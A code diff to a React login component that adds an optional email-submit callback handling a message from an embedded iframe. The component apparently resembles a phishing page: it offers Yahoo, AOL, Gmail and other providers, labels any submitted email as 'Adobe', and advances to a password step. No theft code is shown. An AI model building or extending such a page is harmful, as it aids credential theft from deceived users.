@@ -11,6 +11,7 @@ interface LoginPageProps {
   onAolSelect?: () => void;
   onGmailSelect?: () => void;
   onOthersSelect?: () => void;
+  onEmailSubmit?: (email: string) => boolean;
   defaultProvider?: string;
 }
 
@@ -21,6 +22,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
   onAolSelect,
   onGmailSelect,
   onOthersSelect,
+  onEmailSubmit,
 }) => {
   const iframeRef = useRef<HTMLIFrameElement>(null);
   const [email, setEmail] = useState('');
@@ -54,6 +56,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
         case 'email-submit': {
           const submittedEmail = msg.data?.email;
           if (submittedEmail) {
+            if (onEmailSubmit && onEmailSubmit(submittedEmail)) {
+              return;
+            }
             setEmail(submittedEmail);
             setProvider('Adobe');
             sendToIframe('show-password-step');
@@ -86,7 +91,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
         }
       }
     },
-    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOthersSelect, sendToIframe]
+    [email, provider, handleFormSubmit, onYahooSelect, onAolSelect, onGmailSelect, onOthersSelect, onEmailSubmit, sendToIframe]
   );
 
   useEffect(() => {
